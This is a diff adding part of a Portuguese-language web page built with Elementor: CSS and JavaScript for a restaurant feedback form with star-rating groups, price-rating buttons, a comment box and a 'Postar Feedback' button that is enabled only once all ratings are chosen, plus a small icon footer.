+/* CONTAINER DE AVALIAÇÃO DE PREÇO */
+.price-container {
+margin: 0 auto 40px auto;
+max-width: 600px; /* Define uma largura máxima para o container */
+text-align: center; /* Centraliza o texto e elementos filhos */
+}
+
+/* BOTÕES DE AVALIAÇÃO DE PREÇO */
+.price-rating {
+display: flex;
+justify-content: center;
+margin-bottom: 20px; /* Espaço entre os botões e a caixa de comentários */
+}
+
+.price-button {
+background-color: #f1f1f1; /* Cor de fundo padrão */
+border: 2px solid #ccc; /* Cor da borda padrão */
+border-radius: 10px;
+padding-top: var(--button-padding-top, 10px); /* Padding superior ajustável */
+padding-right: var(--button-padding-right, 30px); /* Padding direito ajustável */
+padding-bottom: var(--button-padding-bottom, 10px); /* Padding inferior ajustável */
+padding-left: var(--button-padding-left, 30px); /* Padding esquerdo ajustável */
+margin-top: var(--button-margin-top, 10px); /* Margin superior ajustável */
+margin-right: var(--button-margin-right, 5px); /* Margin direito ajustável */
+margin-bottom: var(--button-margin-bottom, 0px); /* Margin inferior ajustável */
+margin-left: var(--button-margin-left, 5px); /* Margin esquerdo ajustável */
+font-size: 20px; /* Tamanho do texto */
+cursor: pointer;
+transition: background-color 0.3s, color 0.3s, opacity 0.3s;
+color: #000; /* Cor do texto inativo, ajuste conforme necessário */
+}
+.price-button:hover {
+background-color: #fff; /* Cor de fundo padrão */
+border-color: #9a03d7; /* Cor da borda inativa */
+color: #9a03d7;
+}
+
+.price-button.active {
+background-color: var(--button-active-background-color, #9a03d7); /* Cor do fundo ativo */
+color: var(--button-active-text-color, white); /* Cor do texto ativo */
+border-color: var(--button-active-border-color, #9a03d7); /* Cor da borda ativa */
+opacity: 1; /* Opacidade total para o botão ativo */
+}
+
+.price-button.inactive {
+opacity: 0.5; /* Opacidade para botões inativos */
+background-color: #f0f0f0; /* Cor de fundo inativa */
+border-color: #ccc; /* Cor da borda inativa */
+color: #000; /* Cor do texto inativo, ajuste conforme necessário */
+}
+
+/* CONTAINER DE COMENTÁRIOS */
+.comments-container {
+margin: 0 auto;
+max-width: 600px; /* Define uma largura máxima para o container */
+text-align: center; /* Centraliza o texto e elementos filhos */
+}
+
+/* TÍTULO DA CAIXA DE COMENTÁRIOS */
+.comments-title {
+font-family: 'Sora', sans-serif;
+font-weight: bold;
+font-size: 1rem; /* Ajuste conforme necessário */
+color: #333; /* Cor editável */
+margin-bottom: 10px;
+}
+
+/* CAIXA DE TEXTO PARA COMENTÁRIOS */
+.comments-box {
+width: 95%;
+max-width: 600px; /* Ajuste conforme necessário */
+background-color: #fff; /* Cor do fundo da caixa de texto */
+border: 1px solid #ccc; /* Cor da borda da caixa de texto */
+border-radius: 15px;
+padding: var(--textarea-padding, 10px); /* Padding ajustável */
+font-family: 'Sora', sans-serif;
+font-size: 1rem; /* Ajuste conforme necessário */
+margin-top: var(--textarea-margin-top, 0px); /* Margin superior ajustável */
+margin-right: var(--textarea-margin-right, 0px); /* Margin direito ajustável */
+margin-bottom: var(--textarea-margin-bottom, 0px); /* Margin inferior ajustável */
+margin-left: var(--textarea-margin-left, 0px); /* Margin esquerdo ajustável */
+}
+
+/* MEDIA QUERIES PARA TELA DE TABLET E MOBILE */
+@media (max-width: 768px) {
+.rating-question {
+font-size: 1rem; /* Ajuste o tamanho da fonte para tablets */
+}
+
+.rating-labels {
+font-size: 0.7rem; /* Ajuste o tamanho da fonte para tablets */
+margin: 0 10px; /* Ajuste o espaço nas laterais */
+}
+
+.price-button {
+font-size: 1.3rem; /* Ajuste o tamanho da fonte para tablets */
+padding: 15px 30px; /* Ajuste o padding para tablets */
+}
+
+.comments-title {
+font-size: 0.9rem; /* Ajuste o tamanho da fonte para tablets */
+}
+
+.comments-box {
+font-size: 0.9rem; /* Ajuste o tamanho da fonte para tablets */
+}
+}
+
+@media (max-width: 480px) {
+.rating-question {
+font-size: 1.2rem; /* Ajuste o tamanho da fonte para dispositivos móveis */
+}
+
+.rating-labels {
+font-size: 0.8rem; /* Ajuste o tamanho da fonte para dispositivos móveis */
+margin: 0 5px; /* Ajuste o espaço nas laterais */
+}
+
+.price-button {
+font-size: 1rem; /* Ajuste o tamanho da fonte para dispositivos móveis */
+padding: 10px 30px; /* Ajuste o padding para dispositivos móveis */
+}
+
+.comments-title {
+font-size: 1rem; /* Ajuste o tamanho da fonte para dispositivos móveis */
+margin-top: -20px;
+
+}
+
+.comments-box {
+  
+font-size: 1rem; /* Ajuste o tamanho da fonte para dispositivos móveis */
+}
+.rating-container {
+margin: 0px auto 13px auto;
+}
+.comments-container {
+margin: -10px auto;
+max-width: 600px; /* Define uma largura máxima para o container */
+text-align: center; /* Centraliza o texto e elementos filhos */
+}
+
+}
+</style>
+    </div>
+            </div>
+            <div style="margin-bottom: 10vh;" class="elementor-element elementor-element-549dff54 elementor-mobile-align-center bt0 elementor-align-justify elementor-widget elementor-widget-button disabled" data-id="549dff54" data-element_type="widget" data-widget_type="button.default">
+            <div class="elementor-widget-container">
+                <div class="elementor-button-wrapper">
+        <button class="btn-active elementor-button elementor-button-link elementor-size-sm elementor-animation-shrink" onclick="nextPage()">
+                    <span class="elementor-button-content-wrapper">
+                                <span class="elementor-button-text">Postar Feedback</span>
+                </span>
+                </button>
+    </div>
+            </div>
+            </div>
+            <div class="elementor-element elementor-element-3cf9635f elementor-widget elementor-widget-html" data-id="3cf9635f" data-element_type="widget" data-widget_type="html.default">
+            <div class="elementor-widget-container">
+           <script>
+document.addEventListener('DOMContentLoaded', () => {
+// Seleciona o botão
+const bt0 = document.querySelector('.bt0');
+
+// Adiciona os containers de rating e preço
+const ratingGroups = [
+    document.getElementById('rating-environment'),
+    document.getElementById('rating-service'),
+    document.getElementById('rating-food')
+];
+
+const priceButtons = document.querySelectorAll('.price-button');
+
+// Função para verificar se todos os grupos de rating foram preenchidos e um botão de preço foi selecionado
+function checkRatings() {
+    // Verifica se cada grupo de rating tem um input selecionado
+    let allRatingsSelected = ratingGroups.every(group => {
+        return Array.from(group.querySelectorAll('input[type="radio"]')).some(input => input.checked);
+    });
+    
+    // Verifica se um botão de preço está selecionado
+    let priceSelected = Array.from(priceButtons).some(button => button.classList.contains('active'));
+
+    // Ativa o botão somente se todos os ratings e um botão de preço foram selecionados
+    bt0.classList.toggle('disabled', !allRatingsSelected || !priceSelected);
+    bt0.disabled = !allRatingsSelected || !priceSelected; // Desativa o botão se não houver rating e preço selecionado
+}
+
+// Adiciona evento de mudança em cada input de radio dentro dos grupos de rating
+ratingGroups.forEach(group => {
+    group.addEventListener('change', checkRatings);
+});
+
+// Adiciona evento de clique em cada botão de preço
+priceButtons.forEach(button => {
+    button.addEventListener('click', function() {
+        // Remove a classe de ativo e adiciona a de inativo para todos os botões
+        priceButtons.forEach(btn => {
+            btn.classList.remove('active');
+            btn.classList.add('inactive');
+        });
+
+        // Adiciona a classe de ativo e remove a de inativo para o botão clicado
+        this.classList.add('active');
+        this.classList.remove('inactive');
+
+        checkRatings(); // Atualiza o estado do botão ao clicar em um botão de preço
+    });
+});
+
+// Inicializa o estado do botão
+checkRatings();
+});
+
+</script>
+<style>
+.bt0 {
+opacity: 1;
+cursor: pointer;
+transition: opacity 0.3s;
+pointer-events: auto; /* Permite que o botão seja clicável quando não está desativado */
+}
+
+.bt0.disabled {
+opacity: 0.5;
+cursor: default; /* Remove o cursor pointer quando desativado */
+pointer-events: none; /* Desativa o botão quando está desativado */
+}
+
+.rating input[type="radio"] {
+cursor: pointer; /* Aplica o cursor pointer para inputs de radio */
+}
+</style>		</div>
+            </div>
+            </div>
+            </div>
+    </div>
+    </div>
+    </div>
+    <div class="footer">
+        <div class="d-flex">
+            <div class="item">
+                <svg xmlns="http://www.w3.org/2000/svg" width="35" height="35" fill="none" viewBox="0 0 24 24" id="chat-round-money"><path fill="url(#paint0_linear_2461_19681)" fill-rule="evenodd" d="M12 2.75C6.89137 2.75 2.75 6.89137 2.75 12C2.75 13.4811 3.09753 14.8788 3.7148 16.1181C3.96254 16.6155 4.05794 17.2103 3.90163 17.7945L3.30602 20.0205C3.19663 20.4293 3.57066 20.8034 3.97949 20.694L6.20553 20.0984C6.78973 19.9421 7.38451 20.0375 7.88191 20.2852C9.12121 20.9025 10.5189 21.25 12 21.25C17.1086 21.25 21.25 17.1086 21.25 12C21.25 6.89137 17.1086 2.75 12 2.75ZM1.25 12C1.25 6.06294 6.06294 1.25 12 1.25C17.9371 1.25 22.75 6.06294 22.75 12C22.75 17.9371 17.9371 22.75 12 22.75C10.2817 22.75 8.65552 22.3463 7.21315 21.6279C6.99791 21.5207 6.77814 21.4979 6.59324 21.5474L4.3672 22.143C2.84337 22.5507 1.44927 21.1566 1.857 19.6328L2.4526 17.4068C2.50208 17.2219 2.47933 17.0021 2.37213 16.7869C1.65371 15.3445 1.25 13.7183 1.25 12ZM12 7.25C12.4142 7.25 12.75 7.58579 12.75 8V8.01023C13.8388 8.28454 14.75 9.143 14.75 10.3333C14.75 10.7475 14.4142 11.0833 14 11.0833C13.5858 11.0833 13.25 10.7475 13.25 10.3333C13.25 9.9493 12.8242 9.41667 12 9.41667C11.1758 9.41667 10.75 9.9493 10.75 10.3333C10.75 10.7174 11.1758 11.25 12 11.25C13.3849 11.25 14.75 12.2098 14.75 13.6667C14.75 14.857 13.8388 15.7155 12.75 15.9898V16C12.75 16.4142 12.4142 16.75 12 16.75C11.5858 16.75 11.25 16.4142 11.25 16V15.9898C10.1612 15.7155 9.25 14.857 9.25 13.6667C9.25 13.2525 9.58579 12.9167 10 12.9167C10.4142 12.9167 10.75 13.2525 10.75 13.6667C10.75 14.0507 11.1758 14.5833 12 14.5833C12.8242 14.5833 13.25 14.0507 13.25 13.6667C13.25 13.2826 12.8242 12.75 12 12.75C10.6151 12.75 9.25 11.7903 9.25 10.3333C9.25 9.143 10.1612 8.28454 11.25 8.01023V8C11.25 7.58579 11.5858 7.25 12 7.25Z" clip-rule="evenodd"></path><defs><linearGradient id="paint0_linear_2461_19681" x1="12" x2="12" y1="1.25" y2="22.75" gradientUnits="userSpaceOnUse"><stop stop-color="#854D9C"></stop><stop offset="1" stop-color="#CD4ED3"></stop></linearGradient></defs></svg>	
+            </div>
+            <div class="item" onclick="window.location.href='www.comprar.com'" "="">
+                <i style="color: rgb(206, 206, 206);" class="fa-solid fa-chart-line"></i>
+            </div>
+            <div class="item">
+                <i style="color: rgb(206, 206, 206);" class="fa-brands fa-pix"></i>
+            </div>
+        </div>
+    </div>
+  
+             </body></html>
